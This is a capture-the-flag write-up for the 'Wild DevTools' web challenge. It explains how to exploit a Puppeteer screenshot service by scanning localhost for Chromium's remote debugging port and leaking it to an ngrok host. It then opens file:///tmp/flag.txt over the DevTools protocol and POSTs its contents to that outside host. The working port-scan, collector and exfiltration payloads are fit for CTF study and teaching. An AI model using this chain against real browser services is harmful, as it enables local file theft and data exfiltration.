<hr />

<h2>description: Browser-based Port Scan + Puppeteer Remote Debugging</h2>

<h1>Wild DevTools</h1>

<h2>Challenge</h2>

<p>{% hint style="info" %}
Web, 10 Solves
{% endhint %}</p>

<blockquote>
  <p>One of our hackers stole the source code for a top-secret screenshot service. However, he wasn't able to get the flag.</p>
  
  <p>He kept saying it was impossible. That made me think of you, think you can do it?</p>
</blockquote>

<p>{% file src="../../.gitbook/assets/wild-devtools-source.zip" %}</p>

<h2>Solution</h2>

<p>The goal was to read the flag file, which is written to disk when the server starts up.</p>

<p>```javascript
async function main() {
    const port = 8080;
    const server = express();</p>

<pre><code>// write flag to disk
fs.writeFileSync('/tmp/flag.txt', process.env.FLAG);

...
</code></pre>

<p>```</p>

<p>This was essentially a "screenshotter" service that allows us to enter arbitrary URLs to be rendered by a Chromium instance.</p>

<p>The <code>validateScreenshotRequest</code> middleware makes sure that we specify a HTTP(S) URL, so the <code>file://</code> protocol will not work here.</p>

<p>```javascript
function validateScreenshotRequest(req, res, next) {
    if (!req.query.url || typeof req.query.url !== 'string') {
        return res.status(400).json({ error: 'url is required' });
    }</p>

<pre><code>try {
    let url = new URL(req.query.url);
    if (url.protocol !== 'http:' &amp;&amp; url.protocol !== 'https:') {
        return res.status(400).json({ error: 'invalid protocol' });
    }
} catch {
    return res.status(400).json({ error: 'invalid URL' });
}

next();
</code></pre>

<p>}
```</p>

<p>Of particular interest, however, is the way that the browser instance is launched.</p>

<p>```javascript
async function getBrowserWithTimeout(seconds) {
    log('launching browser...');
    let browser = null;</p>

<pre><code>for (let i = 0; i &lt; 5; i++) {
    if (browser !== null) {
        continue;
    }
    try {
        browser = await puppeteer.launch({
            timeout: 5000,
            headless: true,
            dumpio: true,
            ignoreDefaultArgs: [
                '--disable-popup-blocking'
            ],
            args: [
                '--no-sandbox',
                '--ignore-certificate-errors',
                '--disable-setuid-sandbox',
                '--disable-accelerated-2d-canvas',
                '--disable-gpu',
                '--proxy-server=smokescreen:4750',
                `--remote-debugging-port=${getRandomPort()}`
            ]
        });
    } catch (err) {
        browser = null;
        log(err);
    }
}

...
</code></pre>

<p>```</p>

<p>A remote debugging port is exposed. This normally allows us to send commands to the browser through the <a href="https://chromedevtools.github.io/devtools-protocol/">DevTools protocol</a>. In this case, however, we can see that the debugging port is randomised.</p>

<p><code>javascript
export default function () {
    let port = 9000 + Math.floor(Math.random() * 2000);
    return port;
}
</code></p>

<h3>Leaking the Debugging Port</h3>

<p>We had a range of 2000 possible ports to scan, but the browser will only live for 30 seconds before it was closed.</p>

<p><code>javascript
setTimeout(async () =&gt; {
    try {
        await browser.close();
    } catch (err) {
        log('browser.close() failed:', err.message);
    }
}, seconds * 1000);
</code></p>

<p>If we could leak the debugging port, then we could communicate with the Chromium instance to open a new page with the <code>file:///tmp/flag</code> URL, and read its contents.&#x20;</p>

<p>There are many ways to do this, but my first reaction was to do it through a common XS-Leaks technique. The idea is that if the port is closed, trying to load it as a resource would yield a Connection Refused error, triggering the <code>onerror</code> event handler. Otherwise, the <code>onload</code> event handler would be fired instead on successful loading.</p>

<p>```markup
<html>
    <body>
        <script>
            (async () =&gt; {
                const leak = async (url) =&gt; {
                    return new Promise((r) =&gt; {
                        let s = document.createElement('script')
                        s.src = url
                        s.onload = (e) =&gt; {
                            e.target.remove()
                            return r(0)
                        }
                        s.onerror = (e) =&gt; {
                            e.target.remove()
                            return r(1)
                        }
                        document.head.appendChild(s)
                    })
                }</p>

<pre><code>            for (let i = 0; i &lt; 2000; i++) {
                let port = 9000 + i;
                let res = await leak(`http://localhost:${port}/`)

                if (res == 0) {
                    console.log(`Port ${port} is open`)
                    try {
                        fetch(`http://986d-42-60-68-174.ngrok.io/leak?port=${port}`)
                    }
                    catch {}
                    break
                }
            }
        })();
    &lt;/script&gt;
&lt;/body&gt;
</code></pre>

<p></html>
```</p>

<p>This was sufficient to leak the debugging port within 5-10 seconds. Once we get the port number, we need to modify our second-stage payload with the updated port number, so I wrote the port number to a <code>port.txt</code> file to be read by another script later on.</p>

<p>```python
from flask import Flask, request, send_file</p>

<p>app = Flask(<strong>name</strong>)</p>

<p>@app.route('/<path:path>')
def send(path):
    return send_file(path)</p>

<p>@app.route('/exfil', methods=['POST'])
def receive():
    print(request.data)
    return request.data</p>

<p>@app.route('/leak')
def leak():
    port = request.args.get('port')
    open("port.txt", "w").write(port)
    return "OK"</p>

<p>if <strong>name</strong> == '<strong>main</strong>':
    app.run('0.0.0.0', 5000)
```</p>

<h3>Reading the Response</h3>

<p>Now that we know the port, we could fetch <code>http://127.0.0.1:&lt;PORT&gt;/json/new?file:///tmp/flag.txt</code> to tell the browser to open a new page with the <code>file:///tmp/flag.txt</code> URL.</p>

<p>The response would then contain a <code>webSocketDebuggerUrl</code> that allows us to send commands to the browser through a WebSocket connection.</p>

<p>Unfortunately, due to the same-origin policy, we can't directly read the response through the Fetch API. But by loading an <code>iframe</code>, the response is shown in the screenshotter service as an image. We can add the following to our script above, to load the <code>iframe</code> and open a second-stage exploit after 10 seconds to communicate with the WebSocket URL.</p>

<p>```javascript
...</p>

<p>let ifr = document.createElement('iframe')
ifr.src = <code>http://localhost:${port}/json/new?file:///tmp/flag.txt</code></p>

<p>ifr.height = 1000
ifr.width = 1000
document.body.appendChild(ifr)</p>

<p>setTimeout(() =&gt; {
    window.open("http://986d-42-60-68-174.ngrok.io/exploit.html")
}, 10000)</p>

<p>...
```</p>

<p>The result of the screenshotter service would look something like this. We need to interpret the result and modify our second-stage exploit before the 10 seconds is up and the browser opens it.</p>

<p><img src="../../.gitbook/assets/image (81).png" alt="" /></p>

<p>I used <a href="https://pypi.org/project/pytesseract/">PyTesseract</a> to perform OCR on the result and extract the WebSocket URL. Due to the quality of the image, this was only fully accurate about 1 in 5 times. The script will also update our second-stage payload with the correct port and WebSocket URL.</p>

<p>```python
import requests
import pytesseract
from PIL import Image
from io import BytesIO
import re
import time
import os</p>

<p>while True:</p>

<pre><code>r = requests.get("https://wild-devtools.ctf.bsidestlv.com/screenshot")

puzzle = r.headers['X-Puzzle']

print(f"Puzzle: {puzzle}")

# get pow by running pow.go
pow = os.popen("go run pow/pow.go {}".format(puzzle)).read().strip()
print(f"POW: {pow}")

r = requests.get(
    "http://wild-devtools.ctf.bsidestlv.com/screenshot?url=http://986d-42-60-68-174.ngrok.io/leak.html",
    headers={
        'X-Puzzle': puzzle,
        'X-Proof-of-Work': pow
    }
)
img = r.content

# OCR
with open("screenshot.png", "wb") as f:
    f.write(img)

text = pytesseract.image_to_string(Image.open(BytesIO(img)))
print(text.splitlines()[5])

wsUrl = re.search(r"/devtools/page/(.*)\"", text.splitlines()[5]).group(1).replace(" ", "").replace("S", "5").replace("O", "0").replace("I", "1").replace("L", "1").replace("T", "7")
print(wsUrl)

expl = open("exploit.tpl", "r").read().replace("PORTHERE", open("port.txt", "r").read()).replace("URLHERE", wsUrl)
with open("exploit.html", "w") as f:
    f.write(expl)
</code></pre>

<p>```</p>

<h3>Getting the Flag</h3>

<p>After we have done all that, the second-stage payload is opened. The <code>Runtime.evaluate</code> method is used to execute JavaScript on the <code>file:///tmp/flag.txt</code> page, and exfiltrate its contents.</p>

<p>```markup
<body>
    <script>
        window.ws = new WebSocket('ws://127.0.0.1:PORTHERE/devtools/page/URLHERE')
        ws.onerror = (e =&gt; { console.log(e) })
        ws.onmessage = (e =&gt; {
            console.log(e.data);
        })</p>

<pre><code>    ws.onopen = () =&gt; {
        ws.send(JSON.stringify({
            id: 1,
            method: "Runtime.evaluate",
            params: {
                expression: "fetch('http://986d-42-60-68-174.ngrok.io/exfil', {method:'POST', body:document.body.innerHTML})"
            }
        }))

    }
&lt;/script&gt;
</code></pre>

<p></body>
```</p>
